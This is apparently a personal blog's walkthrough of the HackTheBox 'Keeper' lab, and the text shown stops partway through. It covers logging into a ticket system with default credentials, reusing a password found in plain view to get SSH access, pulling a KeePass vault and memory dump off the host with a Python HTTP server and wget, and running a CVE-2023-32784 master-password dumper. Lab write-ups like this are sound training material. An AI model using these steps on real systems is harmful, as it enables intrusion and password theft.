<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Keeper is an easy box that keeps to the very basics of misconfiguration issues, no complex abuse needed. To start, the webservice is left vulnerable through default credentials being unchanged. Within the web service, a user's setup password is in plain view. The password is also unchanged, allowing us to authenticate via SSH as the user. From here, we can use a recent KeePass vulnerability to leak the keepass master password from an error dump file. After accessing the keepass vault, we find a PuTTY RSA key in the notes, which we can use to authenticate as root.">
<title>HackTheBox - Keeper</title>

<link rel='canonical' href='http://localhost:1313/p/hackthebox-keeper/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Keeper">
<meta property='og:description' content="Keeper is an easy box that keeps to the very basics of misconfiguration issues, no complex abuse needed. To start, the webservice is left vulnerable through default credentials being unchanged. Within the web service, a user's setup password is in plain view. The password is also unchanged, allowing us to authenticate via SSH as the user. From here, we can use a recent KeePass vulnerability to leak the keepass master password from an error dump file. After accessing the keepass vault, we find a PuTTY RSA key in the notes, which we can use to authenticate as root.">
<meta property='og:url' content='http://localhost:1313/p/hackthebox-keeper/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='KeePass' /><meta property='article:tag' content='BestPractical' /><meta property='article:tag' content='putty' /><meta property='article:published_time' content='2024-02-10T07:29:34-06:00'/><meta property='article:modified_time' content='2024-02-10T07:29:34-06:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-keeper/Keeper.png' />
<meta name="twitter:title" content="HackTheBox - Keeper">
<meta name="twitter:description" content="Keeper is an easy box that keeps to the very basics of misconfiguration issues, no complex abuse needed. To start, the webservice is left vulnerable through default credentials being unchanged. Within the web service, a user's setup password is in plain view. The password is also unchanged, allowing us to authenticate via SSH as the user. From here, we can use a recent KeePass vulnerability to leak the keepass master password from an error dump file. After accessing the keepass vault, we find a PuTTY RSA key in the notes, which we can use to authenticate as root."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-keeper/Keeper.png' />
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a>
      <ol>
        <li><a href="#enumerating-web-service">Enumerating Web Service</a></li>
      </ol>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ol>
        <li><a href="#login-via-default-credentials">Login via default credentials</a></li>
        <li><a href="#system-access-via-unsecure-storage-of-passwords">System access via unsecure storage of passwords</a></li>
      </ol>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ol>
        <li><a href="#leveraging-keepass-cve-2023-32784">Leveraging Keepass CVE 2023-32784</a></li>
        <li><a href="#root-access-via-putty-key">Root access via PuTTY Key</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/hackthebox-keeper/">
                <img src="/p/hackthebox-keeper/Keeper_hu7741811097371490548.png"
                        srcset="/p/hackthebox-keeper/Keeper_hu7741811097371490548.png 800w, /p/hackthebox-keeper/Keeper_hu6207361147415833067.png 1600w"
                        width="800" 
                        height="666" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Keeper" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/hackthebox-keeper/">HackTheBox - Keeper</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Keeper is an easy box that keeps to the very basics of misconfiguration issues, no complex abuse needed. To start, the webservice is left vulnerable through default credentials being unchanged. Within the web service, a user&#39;s setup password is in plain view. The password is also unchanged, allowing us to authenticate via SSH as the user. From here, we can use a recent KeePass vulnerability to leak the keepass master password from an error dump file. After accessing the keepass vault, we find a PuTTY RSA key in the notes, which we can use to authenticate as root.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 10, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    8 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration
</h2><p>initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.227
</span></span><span class="line"><span class="cl">Host is up (0.030s latency).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 10.16 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>There are only open ports 80 and 22. SSH typically requires credentials to access, so we will start exploration with the nginx server on port 80:</p>
<p><img src="/p/hackthebox-keeper/Images/IP_Landingpage.png"
	width="710"
	height="286"
	srcset="/p/hackthebox-keeper/Images/IP_Landingpage_hu3260568045119852540.png 480w, /p/hackthebox-keeper/Images/IP_Landingpage_hu16815440753248674476.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="595px"
	
></p>
<h3 id="enumerating-web-service">Enumerating Web Service
</h3><p>We see text that directs us to <code>tickets.keeper.htb/rt/</code>. This appears to be a subdomain for a DNS of <code>keeper.htb</code>, and needs to first be added to our /etc/hosts file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ cat /etc/hosts                                                                              
</span></span><span class="line"><span class="cl">127.0.0.1       localhost
</span></span><span class="line"><span class="cl">127.0.1.1       kali
</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">10.10.11.227 tickets.keeper.htb keeper.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>It might not be necessary, but I decided to add both <code>tickets.keeper.htb</code> and <code>keeper.htb</code> in case we need to resolve both.
Now visiting tickets:</p>
<p><img src="/p/hackthebox-keeper/Images/ticketskeeper.png"
	width="1453"
	height="362"
	srcset="/p/hackthebox-keeper/Images/ticketskeeper_hu10217055200384202807.png 480w, /p/hackthebox-keeper/Images/ticketskeeper_hu5988622215080016061.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="401"
		data-flex-basis="963px"
	
></p>
<h2 id="foothold">Foothold
</h2><h3 id="login-via-default-credentials">Login via default credentials
</h3><p>We see a basic ticket management website asking for login credentials. On this page, we can learn that it is using BestPractical services. When we try default login credentials for BestPractical services (root:password), we find that we are able to login!</p>
<p><img src="/p/hackthebox-keeper/Images/RTataglance.png"
	width="827"
	height="655"
	srcset="/p/hackthebox-keeper/Images/RTataglance_hu4447369005439993718.png 480w, /p/hackthebox-keeper/Images/RTataglance_hu11288235759672210052.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="126"
		data-flex-basis="303px"
	
></p>
<p>Looking for tickets, we can find 1 ticket in the general tab:</p>
<p><img src="/p/hackthebox-keeper/Images/generalticket.png"
	width="930"
	height="385"
	srcset="/p/hackthebox-keeper/Images/generalticket_hu13530232570595135257.png 480w, /p/hackthebox-keeper/Images/generalticket_hu11575587993522896056.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="241"
		data-flex-basis="579px"
	
></p>
<p>We see a name of Lise N√∏rgaard that we might want to remember. The ticket mentions keepass, a service used to store passwords. A very juicy target indeed.</p>
<h3 id="system-access-via-unsecure-storage-of-passwords">System access via unsecure storage of passwords
</h3><p>We can view the conversation history between Lise and rt:</p>
<p><img src="/p/hackthebox-keeper/Images/conversation.png"
	width="890"
	height="550"
	srcset="/p/hackthebox-keeper/Images/conversation_hu11505327131385084593.png 480w, /p/hackthebox-keeper/Images/conversation_hu16048750137398685198.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="388px"
	
></p>
<p>Unfortunately, it looks like the keepass files were removed from the conversation and we are unable to swipe it.</p>
<p>When we view Lise&rsquo;s profile, the user summary doesn&rsquo;t tell us much:</p>
<p><img src="/p/hackthebox-keeper/Images/LiseSummarypng.png"
	width="946"
	height="736"
	srcset="/p/hackthebox-keeper/Images/LiseSummarypng_hu15119945179902289478.png 480w, /p/hackthebox-keeper/Images/LiseSummarypng_hu16759664451790098075.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="128"
		data-flex-basis="308px"
	
></p>
<p>However, when we move to edit, we can find extra details about the person:</p>
<p><img src="/p/hackthebox-keeper/Images/LiseEdit.png"
	width="872"
	height="813"
	srcset="/p/hackthebox-keeper/Images/LiseEdit_hu16327443988206284363.png 480w, /p/hackthebox-keeper/Images/LiseEdit_hu8436833999208445519.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="107"
		data-flex-basis="257px"
	
></p>
<p>Notably, we can see the unix login of <code>lnorgaard</code>, which can be useful for SSH login. Additionally, we find a password used for setup! If Lise has not updated this, we might be able to login:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ssh lnorgaard@keeper.htb        
</span></span><span class="line"><span class="cl">The authenticity of host &#39;keeper.htb (10.10.11.227)&#39; can&#39;t be established.
</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
</span></span><span class="line"><span class="cl">This key is not known by any other names.
</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;keeper.htb&#39; (ED25519) to the list of known hosts.
</span></span><span class="line"><span class="cl">lnorgaard@keeper.htb&#39;s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You have mail.
</span></span><span class="line"><span class="cl">Last login: Tue Feb  6 22:16:25 2024 from 10.10.14.179
</span></span><span class="line"><span class="cl">lnorgaard@keeper:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation
</h2><h3 id="leveraging-keepass-cve-2023-32784">Leveraging Keepass CVE 2023-32784
</h3><p>We are able to authenticate! We might notice that <code>lnorgaard</code> is notified of mail. This can be very interesting for most HTB systems, however in this case it is only the email receipt for the previously discovered ticket.
Within the home folder, we can find an interesting zip:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lnorgaard@keeper:~$ ls -al
</span></span><span class="line"><span class="cl">total 85388
</span></span><span class="line"><span class="cl">drwxr-xr-x 4 lnorgaard lnorgaard     4096 Feb  6 22:52 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 3 root      root          4096 May 24  2023 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root      root             9 May 24  2023 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23  2023 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23  2023 .bashrc
</span></span><span class="line"><span class="cl">drwx------ 2 lnorgaard lnorgaard     4096 May 24  2023 .cache
</span></span><span class="line"><span class="cl">-rw------- 1 lnorgaard lnorgaard       20 Feb  6 22:17 .lesshst
</span></span><span class="line"><span class="cl">-rw------- 1 lnorgaard lnorgaard      807 May 23  2023 .profile
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root      root      87391651 Feb  7 03:28 RT30000.zip
</span></span><span class="line"><span class="cl">drwx------ 2 lnorgaard lnorgaard     4096 Jul 24  2023 .ssh
</span></span><span class="line"><span class="cl">-rw-r----- 1 root      lnorgaard       33 Feb  6 21:56 user.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root      root            39 Jul 20  2023 .vimrc
</span></span></code></pre></td></tr></table>
</div>
</div><p>RT30000 is a very big file, and is the same number associated with our keepass ticket. This zip likely contains all related evidences. We can take this for ourselves using scp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Keeper]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip ./                 
</span></span><span class="line"><span class="cl">lnorgaard@keeper.htb&#39;s password: 
</span></span><span class="line"><span class="cl">RT30000.zip                       4% 3825KB  39.2KB/s   34:39 ETA
</span></span></code></pre></td></tr></table>
</div>
</div><p>This method might take forever, so I decided to keep it in the box..</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lnorgaard@keeper:/dev/shm$ unzip RT30000.zip 
</span></span><span class="line"><span class="cl">Archive:  RT30000.zip
</span></span><span class="line"><span class="cl">  inflating: KeePassDumpFull.dmp     
</span></span><span class="line"><span class="cl"> extracting: passcodes.kdbx          
</span></span><span class="line"><span class="cl">lnorgaard@keeper:/dev/shm$ ls
</span></span><span class="line"><span class="cl">KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip
</span></span><span class="line"><span class="cl">lnorgaard@keeper:/dev/shm$ ls -al
</span></span><span class="line"><span class="cl">total 332808
</span></span><span class="line"><span class="cl">drwxrwxrwt  2 root      root            100 Feb  7 03:34 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 17 root      root           3920 Feb  6 21:55 ..
</span></span><span class="line"><span class="cl">-rwxr-x---  1 lnorgaard lnorgaard 253395188 May 24  2023 KeePassDumpFull.dmp
</span></span><span class="line"><span class="cl">-rwxr-x---  1 lnorgaard lnorgaard      3630 May 24  2023 passcodes.kdbx
</span></span><span class="line"><span class="cl">-rw-r--r--  1 lnorgaard lnorgaard  87391651 Feb  7 03:33 RT30000.zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>After unzipping, we see the original keepass database <code>passcodes.kdbx</code>, and the error dump. Typically, the keepass file is all we care about since it stores the passwords. However, when researching how to extract passwords from keepass, we might find a <a class="link" href="https://github.com/vdohney/keepass-password-dumper"  target="_blank" rel="noopener"
    >recent vulnerability that involves a dump file</a>. This github project is designed to extract the master password used during the creation of the dump file, which can be used to open the original keepass vault! To use, it is best for me to transfer the vault and dump file to my system. To mix it up a little, I decided to transfer via python simple http server. This time it is a lot quicker, thankfully!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lnorgaard@keeper:/dev/shm$ python3 -m http.server 8888
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
</span></span></code></pre></td></tr></table>
</div>
</div><p>And now I can wget the files from my kali:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Keeper]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ wget http://keeper.htb:8888/passcodes.kdbx
</span></span><span class="line"><span class="cl">--2024-02-06 20:37:11--  http://keeper.htb:8888/passcodes.kdbx
</span></span><span class="line"><span class="cl">Resolving keeper.htb (keeper.htb)... 10.10.11.227
</span></span><span class="line"><span class="cl">Connecting to keeper.htb (keeper.htb)|10.10.11.227|:8888... connected.
</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
</span></span><span class="line"><span class="cl">Length: 3630 (3.5K) [application/octet-stream]
</span></span><span class="line"><span class="cl">Saving to: ‚Äòpasscodes.kdbx‚Äô
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">passcodes.kdbx               100%[==============================================&gt;]   3.54K  --.-KB/s    in 0s      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024-02-06 20:37:11 (625 MB/s) - ‚Äòpasscodes.kdbx‚Äô saved [3630/3630]
</span></span></code></pre></td></tr></table>
</div>
</div><p>The same is done for the dump file.</p>
<p>When launching the password dumper from kali, we might first get an error about incompatible .NET kits:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Keeper/keepass-password-dumper]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ dotnet run ../KeePassDumpFull.dmp     
</span></span><span class="line"><span class="cl">/usr/share/dotnet/sdk/6.0.400/Sdks/Microsoft.NET.Sdk/targets/Microsoft.NET.TargetFrameworkInference.targets(144,5): error NETSDK1045: The current .NET SDK does not support targeting .NET 7.0.  Either target .NET 6.0 or lower, or use a version of the .NET SDK that supports .NET 7.0. [/home/kali/Documents/Keeper/keepass-password-dumper/keepass_password_dumper.csproj]                                                                                                 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The build failed. Fix the build errors and run again.
</span></span></code></pre></td></tr></table>
</div>
</div><p>To resolve this issue, I changed the target framework in <code>csproj</code> to net6.0 from net7.0:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
